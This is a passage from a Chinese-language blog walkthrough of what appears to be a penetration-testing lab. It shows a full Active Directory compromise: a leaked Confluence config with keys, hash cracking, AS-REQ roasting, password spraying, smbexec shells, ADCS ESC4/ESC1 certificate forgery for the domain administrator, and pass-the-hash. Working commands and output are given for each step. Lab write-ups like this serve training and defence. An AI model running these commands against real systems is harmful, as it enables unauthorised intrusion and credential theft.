ZbtREvCPe+5MmlL006XHyECf6H9J91yCIshdIXDBiIw+DjHZHDFOiqxvqAtEu5SgiHsab9Cjx1iwSyynBUzSe8O2wIL7mbFV3BJ5Yk07Cm8fvq5E3u9Zqkoi0zTjoz/jc5dT3KHv0Y/SgpGLGwKBwQDg3LJr42aY+slcdadSaKrOYjSlJuxoqIXQfPOO0lSN8grUaBPBTx5RlzkFomqifZpISPHGGL/KKv+L4JBnF8iZ+MeOyuFUKYz3kFzx+CGepibxREPxCJlphP+0NU2TDT0dAHoSa6lB0i0pAnK1iWLnAEciKGDaes/s6WyoDL1YRJJB4sC2EWpGCQ61qucX7Fdzh6hPxtIFlEg32xBIkxrNfS4NQZSafHNoksXAlRshRhfPyYoK4r6SXCKMQznt6/0CgcBKIqKMvB5pTc9K/+6dOUn8kN7NViRRrw1Z2u/00CewugYOFzLjBHAYeMcEEe5m9kcAZJpPouaQQpS/LsUTyAMU+MJ8tSpE/G9LuWHWogi42S28JIygR269lG/U0qYWQqPxN+WfVKg4wprUbNtef1E56hHhjfBWyVcz2saTmi6KmQ5uKDm0gmQAElXHqNYPFPRkdRebDJNGE60sQ787DeAd+2WuVaxokPasb/ar5mPQFtFAlUWZxvQhhC1RCuXBa5ECgcEAgPV3V6c/LPNCS6le6SZexH0/p3olQunjvEcPIjp2GnzTf0VoO+RZggSw1y3Rtmvuh0KLTLRdK1Ewn68cqFoc/9MJ8LeNG12iPPH6JdPJ4GktNPjJEtveladjp/Yts4SoRknEi7SRIZIpZZX8YSwmglws/rj58ddbcj0K2lCKEyeOrq60vTyWQ8lDcRFDWiiXy8u+akcdQ/89QYjObAoEYhJ+jeWP5H8r18A88GVNf+Z9i+q4OA73Dnbw6mdDGjRP<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jwt.public.key&quot;</span>&gt;</span>MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAsk9zn1dWb14rU4yHIMoGYMw14qZopFaW9jxF2t8o3LefYapZ7HJ5YJTCcDD6M9NO7n5BdG54CP68YCU/xL0heB0V7/qccDgBeym4MJTP8X+v6eWVYTFYNQ+I+VtsZfTwutM3e+J+0rvKdiyY5kHlmRclRul3d3XFNchI38oxE2Q1qh7MInHKbUcd6oqDj1zmZGiNDfGjF/yqkK6BasAAkg77sRh0mDEhEs+WgkPt+b1h5leI16XPpaev0IMEVyax3gAIU6pCoqDr9YtmzxbK0UZCyiV8zSbf/l/r9iL9I9B/HAQRJBwl0SpG7YVwNEG1uGctq+ByRwfMJHuMQ5NPELbih7kET7gEDMwaoBpcIBhCphJGS1hZJzY0x00xaUid9pmu6eCbP2uzTOyn3mXFHVrS7krknwO7oRC1PU8EWbeDBaA+1Sx8aF7gcxxaQWc+R6wk1wR97IWwZ3z5/AQNnAEGKesTXl29oCYAvJxCJSNc58f0ps42G/CEI2zFcLtfAgMBAAE=<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;lucene.index.dir&quot;</span>&gt;</span>$&#123;localHome&#125;/index<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;synchrony.encryption.disabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;synchrony.proxy.enabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;webwork.multipart.saveDir&quot;</span>&gt;</span>$&#123;localHome&#125;/temp<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">confluence-configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到用户名和密码：confluenceuser&#x2F;confdsdgfd</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125204332425.png" class="">

<p>找到三个用户名</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125204519223.png" class="">

<p>这里有凭据需要破解</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 12001 -a 0 test2 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125205138856.png" class="">

<p>得到用户cslab密码123456，登陆到后台看看空间有什么东西</p>
<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125210011534.png" class="">

<p>又一些核心成员的名字，创建一个文件保存他们</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">cslab</span><br><span class="line">Harvey</span><br><span class="line">Alana</span><br><span class="line">Sameer</span><br><span class="line">Mia</span><br><span class="line">harvey</span><br><span class="line">alana</span><br><span class="line">sameer</span><br><span class="line">mia</span><br></pre></td></tr></table></figure>

<h2 id="AS-REQ-Roasting"><a href="#AS-REQ-Roasting" class="headerlink" title="AS-REQ Roasting"></a>AS-REQ Roasting</h2><p>使用 <code>impacket-GetNPUsers</code> 工具进行 AS-REQ Roasting 攻击，AS-REQ Roasting 是一种针对<br>Kerberos 协议的攻击方法，如果用户设置了 “不需要预认证” 属性，可以获取用户的 NT hash。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q impacket-GetNPUsers -dc-ip 10.10.10.5 -usersfile user.txt cyberstrike.lab/ -no-pass</span><br></pre></td></tr></table></figure>

<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125210935453.png" class="">

<ul>
<li><code>**KDC_ERR_C_PRINCIPAL_UNKNOWN**</code> <strong>错误</strong>：<br>  这表明测试的大部分用户名在域（<code>cyberstrike.lab</code>）的 Kerberos 数据库中<strong>不存在</strong>。可能是这些用户名是无效的、拼写错误，或不属于该域。</li>
<li><code>**User cslab doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set**</code>：</li>
<li>确认了域中<strong>存在</strong> <code>**cslab**</code> <strong>这个用户</strong>（因为没有返回 “未知主体” 错误）。</li>
<li>但该用户<strong>启用了预认证</strong>（未设置 <code>UF_DONT_REQUIRE_PREAUTH</code> 属性），因此无法通过 AS-REQ Roasting 攻击获取其哈希。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q ./nxc smb 10.10.10.66 -u cslab -p /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<p>爆破出来密码是cslab\qwe!@#123,但是发现本地的administrator也可以登陆</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./proxychains4 -f proxychains.conf ../nxc smb 10.10.10.66 -u &#x27;Administrator&#x27; -p &#x27;qwe!@#123&#x27; --ignore-pw-decoding -d &#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>--ignore-pw-decoding</code></strong>:</p>
<ul>
<li><p><strong>关键参数</strong>。这个标志告诉 NetExec 在处理密码时忽略解码错误或强制以特定方式处理密码字符串。</p>
</li>
<li><p><em>为什么用它？</em> 当密码包含特殊字符（如本例中的 <code>!@#</code>）或非标准字符集时，工具内部的编码转换可能会报错。加上这个参数通常是为了防止因为编码问题导致工具崩溃或报错，确保密码能原样发送。</p>
</li>
</ul>
</li>
<li><p><strong><code>-d &#39;.&#39;</code></strong>:</p>
<ul>
<li><strong>关键参数</strong>。指定域名（Domain）。</li>
<li>使用 <code>.</code> (点) 代表 **Local (本地验证)**。</li>
<li>这意味着告诉工具：“不要去域控制器（Domain Controller）验证这个账号，而是去目标机器 <code>10.10.10.66</code> 本地的 SAM 数据库验证。”这通常用于验证本地管理员密码。</li>
</ul>
</li>
</ul>
<p>直接smbexe连上去就可以</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q  impacket-smbexec ./Administrator:&#x27;qwe!@#123&#x27;@10.10.10.66 -dc-ip 10.10.10.5 -codec gbk</span><br></pre></td></tr></table></figure>

<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125213638965.png" class="">

<p>继续探测发现证书服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./proxychains4 -f proxychains.conf ../nxc smb 10.10.10.5 -u cslab -p qwe!@#123 --shares</span><br></pre></td></tr></table></figure>


<h2 id="ADCS-ESC4"><a href="#ADCS-ESC4" class="headerlink" title="ADCS-ESC4"></a>ADCS-ESC4</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy-ad find -u &#x27;cslab@cyberstrike.lab&#x27; -p &#x27;qwe!@#123&#x27; -dc-ip 10.10.10.5 -vulnerable</span><br></pre></td></tr></table></figure>

<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125215151138.png" class="">


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CA Name                             : cyberstrike-DC-CA</span><br><span class="line">Template Name                       : DC</span><br><span class="line">Full Control Principals         : CYBERSTRIKE.LAB\Domain Admins</span><br><span class="line">                                          CYBERSTRIKE.LAB\Enterprise Admins</span><br><span class="line">Write Owner Principals          : CYBERSTRIKE.LAB\Domain Admins</span><br><span class="line">                                          CYBERSTRIKE.LAB\Enterprise Admins</span><br><span class="line">Write Dacl Principals           : CYBERSTRIKE.LAB\Domain Admins</span><br><span class="line">                                          CYBERSTRIKE.LAB\Enterprise Admins</span><br><span class="line">Write Property Enroll           : CYBERSTRIKE.LAB\Domain Admins</span><br><span class="line">                                          CYBERSTRIKE.LAB\Domain Computers</span><br><span class="line">                                          CYBERSTRIKE.LAB\Enterprise Admins</span><br><span class="line">ESC4                              : User has dangerous permissions.</span><br></pre></td></tr></table></figure>

<p>Full Control Principals 由 CYBERSTRIKE.LAB\Domain Admins 和 CYBERSTRIKE.LAB\Enterprise Admins 掌握，这两个高权限组因此拥有对该证书模板的全部操作权限，包括修改各项属性、调整权限配置、删除模板等，从权限覆盖范围来说是最高级别的控制能力，符合域内高权限组对关键对象的管理需求。</p>
<p>Write Owner Principals 同样分配给 CYBERSTRIKE.LAB\Domain Admins 和 CYBERSTRIKE.LAB\Enterprise Admins，意味着这两个组有权修改该证书模板的所有者属性，而在 Windows 系统中，对象的所有者默认对对象拥有修改权限，此处由高权限组掌握该权限，可确保对模板所有权的控制，避免低权限主体通过篡改所有者身份获取不当权限。</p>
<p>Write Dacl Principals 仅属于 CYBERSTRIKE.LAB\Domain Admins 和 CYBERSTRIKE.LAB\Enterprise Admins，这使得他们能够修改该证书模板的自主访问控制列表（DACL），具体来说可以添加或移除其他主体对模板的权限项，比如为某个低权限用户或组授予注册权限等，由于该权限能间接控制其他主体的权限获取，是权限链中较为关键的控制节点。</p>
<p>Write Property Enroll 除了 CYBERSTRIKE.LAB\Domain Admins 和 CYBERSTRIKE.LAB\Enterprise Admins 外，还包含 CYBERSTRIKE.LAB\Domain Computers，这意味着域内所有计算机账户组成的组有权修改该证书模板的 “注册” 相关属性，结合之前提到的可编辑模板的条件，这一配置为利用提供了可能，攻击者若控制域内某台计算机的系统账户，便可借助该权限调整模板的注册规则，为后续操作铺路。</p>
<p>主要利用的是Domain Admins具有Write Dacl Principals的权限，来修改模板的配置，然后利用ECS1来打即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certipy.exe template -u &quot;cslab@cyberstrike.lab&quot; -p &quot;qwe!@#123&quot; -dc-ip 10.10.10.5 -template &quot;DC&quot; -write-default-configuration</span><br></pre></td></tr></table></figure>

<img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125224028457.png" class="">

<h2 id="ADCS-ESC1"><a href="#ADCS-ESC1" class="headerlink" title="ADCS-ESC1"></a>ADCS-ESC1</h2><img src="/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/20251125224216112.png" class="">

<p>申请 XR Manager 证书模版并伪造域管理员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Certipy.exe req -u &quot;cslab@cyberstrike.lab&quot; -p &quot;qwe!@#123&quot; -dc-ip 10.10.10.5 -target 10.10.10.5 -ca cyberstrike-DC-CA -template DC -upn administrator@cyberstrike.lab</span><br><span class="line">Certipy v5.0.4 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 3</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@cyberstrike.lab&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Try using -sid to set the object SID or see the wiki for more details</span><br><span class="line">[*] Saving certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">[*] Wrote certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>

<p>得到administrator.pfx,然后利用administrator.pfx证书获取 TGT 和 NTLM Hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">certipy.exe auth -pfx administrator.pfx -dc-ip 10.10.10.5 -username administrator -domain cyberstrike.lab</span><br><span class="line">Certipy v5.0.4 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: &#x27;administrator@cyberstrike.lab&#x27;</span><br><span class="line">[*] Using principal: &#x27;administrator@cyberstrike.lab&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Wrote credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@cyberstrike.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:931ec8a3de75c4e55f136d7ff3a9bb6e</span><br></pre></td></tr></table></figure>

<p>最后打pth</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 smbexec.py -hashes :931ec8a3de75c4e55f136d7ff3a9bb6e cyberstrikelab.com/administrator@10.10.10.5</span><br></pre></td></tr></table></figure>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Confluence-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-26134%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REQ-Roasting"><span class="toc-number">4.</span> <span class="toc-text">AS-REQ Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC4"><span class="toc-number">5.</span> <span class="toc-text">ADCS-ESC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC1"><span class="toc-number">6.</span> <span class="toc-text">ADCS-ESC1</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&text=lab11"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&is_video=false&description=lab11"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=lab11&body=Check out this article: https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&title=lab11"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&name=lab11&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.cn/2025/11/25/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab11/&t=lab11"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
